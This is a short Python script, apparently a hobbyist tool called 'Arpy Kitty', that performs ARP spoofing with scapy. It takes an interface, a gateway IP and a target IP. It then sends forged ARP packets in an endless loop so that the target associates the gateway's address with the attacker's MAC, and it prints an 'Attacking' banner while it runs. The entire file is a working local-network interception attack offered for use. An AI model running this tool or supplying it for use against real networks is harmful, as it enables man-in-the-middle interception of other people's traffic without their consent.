#Angelo Ruwantha
#@angelowin32 http://h3llwings.wordpress.com
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import argparse
from scapy.all import *
import sys,os

if not os.geteuid() == 0:
    sys.exit('duude sudo me :(')
print """\033[1;33m

|____|____|____|____|____|____|____|____|____|____|____|____|____
 ____|____|____|____|____|____|____|____|____|____|____|____|____|
 __|____|____|____|____|___|_         ____|____|____|____|____|__
 |____|____|____|____|___|    (\.-./)  _|____|____|____|___|___|_ 
____|____|____|____|____|_  = (^ Y ^) =  _|____|____|____|____|__
|____|____|____|____|____|___ /`---`\ __|____|____|____|____|____|
 __|____|____|____|____|____|_U___|_U|____|____|____|____|____|_          
 |____|____|____|____|____|____|____|____|____|____|____|____|____
____|____|____|____|____|____|____|____|____|____|____|____|____|_

\033[1;m"""
print '\033[1;33m\t\t\t\t\tArpy Kitty\033[1;m'
print '\033[1;33m\t\t\t\t\t\thttp:\\\www.h3llwings.wordpress.com\033[1;m'
print '\033[1;33m\t\t\t\t\t\t@angelowin32\033[1;m'
def getMAC(iface):
	if (get_if_hwaddr(iface)!="00:00:00:00:00:00") & (get_if_hwaddr(iface)!=""):
 		return get_if_hwaddr(iface)
	else:
		print "Error in MACS"
def spoof(gateway,target,mac,interface):

		ARP_packet = Ether()/ARP(op="who-has",hwsrc=mac,psrc=gateway,pdst=target)
		sendp(ARP_packet,loop=1,verbose=False,iface=interface) 
 
	
def Main_():
	

	parser = argparse.ArgumentParser(description='ARP Spoofing tool')
	parser=argparse.ArgumentParser()
	parser.add_argument('--interface', required=True,help='interface name ex:eth0')
	parser.add_argument('--gatewayIP', required=True,help='Gateway IP address')
	parser.add_argument('--targetIP', required=True,help='Target IP address')
	args=parser.parse_args()
	print '\033[1;41m[!]To stop Attack use [ctrl+c]\033[1;m'
	print '\033[1;32m[*]Inteface:'+args.interface+' \033[1;m'
	print '\033[1;32m[*]Gateway IP:'+args.gatewayIP+' \033[1;m'
	print '\033[1;32m[*]Target IP:'+args.targetIP+'\033[1;m'
	print '\033[1;32m[*]My MAC:'+getMAC(args.interface)+'\033[1;m'
	print '\033[1;32m[*]Attacking....... \033[1;m'
	spoof(args.gatewayIP,args.targetIP,getMAC(args.interface),args.interface)
	 
if __name__=='__main__':
	Main_()
